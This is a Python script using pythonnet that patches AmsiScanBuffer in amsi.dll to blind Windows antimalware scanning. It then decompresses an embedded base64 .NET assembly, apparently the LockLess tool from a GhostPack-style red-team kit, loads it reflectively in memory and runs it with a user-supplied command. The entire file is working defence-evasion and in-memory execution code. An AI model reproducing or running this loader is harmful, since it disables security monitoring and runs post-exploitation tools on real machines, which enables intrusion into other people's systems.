import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("LockLess.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()